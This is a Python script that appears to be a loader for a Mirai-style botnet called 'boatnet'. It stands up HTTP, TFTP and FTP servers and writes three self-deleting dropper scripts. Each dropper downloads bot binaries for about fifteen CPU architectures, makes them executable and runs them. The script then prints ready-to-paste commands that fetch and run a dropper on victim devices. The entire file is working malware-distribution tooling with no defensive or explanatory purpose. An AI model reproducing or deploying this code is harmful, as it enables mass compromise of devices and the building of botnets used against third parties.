import subprocess, sys, urllib

ip = urllib.urlopen('http://api.ipify.org').read()
exec_bin = "boatnet"
bin_prefix = "boatnet."
bin_directory = "hiddenbin"
archs = [
    "x86",
    "mips",
    "arc",
    "i486",
    "i686",
    "x86_64",
    "mpsl",
    "arm",
    "arm5",
    "arm6",
    "arm7",
    "ppc",
    "spc",
    "m68k",
    "sh4"
]

def run(cmd):
    subprocess.call(cmd, shell=True)

print("Setting up HTTP, TFTP and FTP for your payload")
run("yum install httpd xinetd tftp tftp-server vsftpd -y &> /dev/null")
run("service httpd start &> /dev/null")
run("service vsftpd start &> /dev/null")
run("service xinetd start &> /dev/null")

run('''cat > /var/www/html/ohshit.sh << 'EOF'
#!/bin/sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
for arch in x86 mips arc i486 i686 x86_64 mpsl arm arm5 arm6 arm7 ppc spc m68k sh4; do
    wget http://''' + ip + '''/hiddenbin/boatnet.$arch -O /tmp/bot_$arch 2>/dev/null
    chmod +x /tmp/bot_$arch 2>/dev/null
    /tmp/bot_$arch 2>/dev/null &
done
rm -rf /tmp/ohshit.sh
EOF
''')

run('''cat > /var/lib/tftpboot/ohshit.sh << 'EOF'
#!/bin/sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
for arch in x86 mips arc i486 i686 x86_64 mpsl arm arm5 arm6 arm7 ppc spc m68k sh4; do
    tftp ''' + ip + ''' -c get boatnet.$arch 2>/dev/null
    chmod +x boatnet.$arch 2>/dev/null
    ./boatnet.$arch 2>/dev/null &
done
rm -rf /tmp/ohshit.sh
EOF
''')

run('''cat > /var/ftp/ohshit1.sh << 'EOF'
#!/bin/sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
for arch in x86 mips arc i486 i686 x86_64 mpsl arm arm5 arm6 arm7 ppc spc m68k sh4; do
    ftpget -v -u anonymous -p anonymous -P 21 ''' + ip + ''' boatnet.$arch boatnet.$arch 2>/dev/null
    chmod +x boatnet.$arch 2>/dev/null
    ./boatnet.$arch 2>/dev/null &
done
rm -rf /tmp/ohshit1.sh
EOF
''')

run("chmod +x /var/www/html/ohshit.sh")
run("chmod +x /var/lib/tftpboot/ohshit.sh")
run("chmod +x /var/ftp/ohshit1.sh")
run("service httpd restart &> /dev/null")
run("service xinetd restart &> /dev/null")

print("\x1b[0;32mPayload ready at: http://" + ip + "/ohshit.sh")
print("")
print("Command:")
print("cd /tmp; wget http://" + ip + "/ohshit.sh; chmod +x ohshit.sh; sh ohshit.sh")
print("")
print("tftp " + ip + " -c get ohshit.sh; sh ohshit.sh")
print("ftpget -v -u anonymous -p anonymous -P 21 " + ip + " ohshit1.sh ohshit1.sh; sh ohshit1.sh")
